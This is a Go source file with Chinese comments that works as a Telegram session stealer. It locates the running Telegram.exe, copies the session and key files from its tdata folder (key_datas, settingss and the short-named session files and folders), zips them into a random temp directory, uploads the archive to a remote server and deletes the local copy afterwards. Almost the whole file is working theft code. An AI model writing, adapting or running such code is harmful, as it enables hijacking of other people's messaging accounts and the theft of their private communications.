package main

import (
    "flag"
    "fmt"
    "log"
    "path/filepath"

    "tg_go/pkg/file"
    "tg_go/pkg/network"
    "tg_go/pkg/process"
    "tg_go/pkg/zip"
)

var (
    processName    = flag.String("pn", "Telegram.exe", "进程名称")
    sourcePath     = flag.String("sp", "", "源目录路径")
    destPath       = flag.String("dp", "", "目标目录路径")
)

func main() {
    flag.Parse()

    // 如果没有指定源路径，则通过进程名查找
    if *sourcePath == "" {
        proc, err := process.GetProcessByName(*processName)
        if err != nil {
            log.Fatalf("查找进程失败: %v", err)
        }
        *sourcePath = filepath.Join(filepath.Dir(proc.Path), "tdata")
        fmt.Printf("tdata文件路径为: %s\n", *sourcePath)
    }

    // 创建临时目录
    var tempDir string
    if *destPath == "" {
        exePath, err := file.GetExecutablePath()
        if err != nil {
            log.Fatalf("获取可执行文件路径失败: %v", err)
        }
        tempDir = filepath.Join(exePath, file.GetRandomString(8))
    } else {
        tempDir = filepath.Join(*destPath, file.GetRandomString(8))
    }

    if err := file.CreateDirectory(tempDir); err != nil {
        log.Fatalf("创建临时目录失败: %v", err)
    }
    defer file.DeleteDirectory(tempDir)

    // 复制需要的文件
    files, err := file.GetFiles(*sourcePath)
    if err != nil {
        log.Fatalf("获取文件列表失败: %v", err)
    }

    for _, filePath := range files {
        fileName := filepath.Base(filePath)
        if len(fileName) == 17 {
            destFile := filepath.Join(tempDir, fileName)
            if err := file.CopyFile(filePath, destFile); err != nil {
                log.Printf("复制文件失败: %v", err)
                continue
            }
        } else if len(fileName) == 16 {
            // 创建子目录
            subDir := filepath.Join(tempDir, fileName)
            if err := file.CreateDirectory(subDir); err != nil {
                log.Printf("创建子目录失败: %v", err)
                continue
            }

            // 复制子目录中的文件
            subFiles, err := file.GetFiles(filepath.Join(*sourcePath, fileName))
            if err != nil {
                log.Printf("获取子目录文件列表失败: %v", err)
                continue
            }

            for _, subFile := range subFiles {
                subFileName := filepath.Base(subFile)
                destFile := filepath.Join(subDir, subFileName)
                if err := file.CopyFile(subFile, destFile); err != nil {
                    log.Printf("复制子目录文件失败: %v", err)
                }
            }
        } else if fileName == "key_datas" {
            destFile := filepath.Join(tempDir, fileName)
            if err := file.CopyFile(filePath, destFile); err != nil {
                log.Printf("复制key_datas文件失败: %v", err)
            }
        } else if fileName == "settingss" {
            destFile := filepath.Join(tempDir, fileName)
            if err := file.CopyFile(filePath, destFile); err != nil {
                log.Printf("复制settingss文件失败: %v", err)
            }
        }
    }

    // 压缩文件
    zipFile := tempDir + ".zip"
    if err := zip.CompressDirectory(tempDir, zipFile); err != nil {
        log.Fatalf("压缩文件失败: %v", err)
    }
    fmt.Printf("生成文件路径为: %s\n", zipFile)

    // 上传文件到服务器
    config := network.DefaultUploadConfig(zipFile)
    if err := network.UploadFile(config); err != nil {
        log.Printf("上传文件失败: %v", err)
    } else {
        fmt.Println("文件上传成功")
    }
    
    // 删除临时zip文件
    if err := file.DeleteFile(zipFile); err != nil {
        log.Printf("删除zip文件失败: %v", err)
    }
} 